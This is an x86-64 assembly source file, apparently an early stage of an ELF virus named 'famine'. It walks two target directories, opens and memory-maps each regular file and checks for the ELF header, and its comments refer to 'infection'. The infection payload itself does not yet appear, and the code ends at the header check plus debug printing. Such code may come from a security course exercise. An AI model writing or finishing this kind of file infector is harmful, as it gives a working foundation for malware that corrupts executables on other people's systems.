%include "header.asm"
[BITS 64]

extern xprintf

section .text
    global _famine

_famine:
    ; maybe push ALL USEFULL REGISTERS to restore state before leaving infection
    PUSH
    mov rbp, rsp
    rel_init
    sub rsp, FILE_SIZE + DIRENT + FSTAT + MAPPED_FILE
    mov r14, 1

target_dir:
    .f1:
        lea rdi, [rel(hook.folder_1)]
        jmp open_dir
    .f2:
        mov r14, 0
        lea rdi, [rel(hook.folder_2)]

open_dir:
    mov rsi, 0                                         ; read only
    mov rax, SYS_OPEN
    syscall
    cmp rax, 0                                         ; Quit if cannot OPEN
    jle next_dir    

    mov rdi, rax
    mov rax, SYS_GETDENTS
    mov rsi, rsp
    add rsi, 256                                       ; offset struct dirent
    mov rdx, 1024
    syscall
    mov r8, rax
    mov rax, SYS_CLOSE
    syscall
    xor rbx, rbx                                       ; buffer offset

find_file:
    cmp rbx, r8
    jge next_dir
    lea rsi, [rsp + 256]                               ; struct
    add rsi, rbx                                       ; current offset
    add rsi, LDIRENT_64.d_type
    cmp byte [rsi], 0x8                                ; DT_REG
    jne next_file

    lea  rdi, [rsp + 256 + rbx + LDIRENT_64.d_name]

target_file:
    ; push qword [rbx]
    mov rax, rdi
    lea rdi, [rsp]
    cmp r14, 1
    je .ff1
    cmp r14, 0
    je .ff2
    .ff1:
        lea rsi, [rel(hook.folder_1)]
        jmp .path_dir
    .ff2:
        lea rsi, [rel(hook.folder_2)]
    .path_dir:
        movsb
        cmp byte [rsi], 0
        jne .path_dir
    mov rsi, rax
    .append_file:
        movsb
        cmp byte [rsi], 0
        jne .append_file
%ifdef DEBUG
    lea rdi, [rsp]
    sub rcx, rcx
    sub al, al
    not rcx
    cld
    repne scasb
    not rcx
    dec rcx
    mov [rsp + rcx + 1], byte 0x0                       ; Work because we do not use dirent for now.
    dbgs [rel(hook.target)], [rsp]
%endif

validate_target:
    lea rdi, [rsp]                                      ; filename
    mov rax, SYS_OPEN
    mov rsi, 0x0                                        ; O_RDONLY
    syscall
    cmp al, 0
    jle next_file
    mov rdi, rax
    mov r15, rax
    mov rsi, rsp
    add rsi, FILE_SIZE + DIRENT
    mov rax, SYS_FSTAT
    syscall
    cmp rax, 0
    jne next_file
%ifdef DEBUG
    dbg [rel(hook.fz)], [rsp + FILE_SIZE + DIRENT + 48] ; st_size
%endif

map_target:
    push r8                                                 ; save dirent size
    mov rdi, 0x0
    mov rsi, QWORD [rsp + FILE_SIZE + DIRENT + 48 + 8]      ; filesz
    mov rdx, 0x3                                            ; READ | WRITE
    mov r10, 0x0002                                         ; MAP_PRIVATE
    mov r8, r15                                             ; fd
    mov r9, 0                                               ; starting at offset 0
    mov rax, 9
    syscall
    mov [rbp - 16], rax                                     ; store mapped file
    pop r8                                                  ; restore dirent size

elf_header:
    mov rsi, [rbp - 16]
    cmp dword [rsi], 0x464c457f                             ; 7fELF
    jne next_file

    ; mov ax, word [rsi + Elf64_Ehdr.e_type]               ; We need to check for ET_EXEC or ET_DYN
%ifdef DEBUG
    mov rsi, [rbp - 16]
    movzx rsi, word [rsi + Elf64_Ehdr.e_type] 

    ; movzx rax, word [rsi + Elf64_Ehdr.e_type] 
    dbg [rel(hook.e_type)], rsi
%endif

next_file:
    ; maybe RBX not valid anymore aswell.
    ; pop rbx
    mov rcx, FILE_SIZE
    memset [rsp], rcx                                       ; FILESIZE memset
    movzx r9, word [rsp + 256 + rbx + LDIRENT_64.d_reclen]  ; offset dirent + offset + d_reclen
    add rbx, r9
    jmp find_file

next_dir:
    mov rcx, rbx                    ; maybe push RBX before
    memset [rsp + 256], rcx         ; DIRENT_BUF memset
    .next:
        cmp r14, 1
        jge target_dir.f2

quit:
    add rsp, FILE_SIZE + DIRENT + FSTAT + MAPPED_FILE
    POP

    mov rax, SYS_EXIT 
    mov rdi, 0
    syscall
hook:
    .folder_1:
        db FOLDER_1, 0
    .folder_2:
        db FOLDER_2, 0
%ifdef DEBUG
    .newline:
        db 0xa, 0
    .fz:
        db "Filesize : 0x%x", 0xa, 0
    .target:
        db "Target_file : %s", 0xa, 0
    .e_type:
        db "e_type : %x", 0xa, 0
    .string:
        db "%s", 0xa, 0
    .number:
        db "%x", 0xa, 0
%endif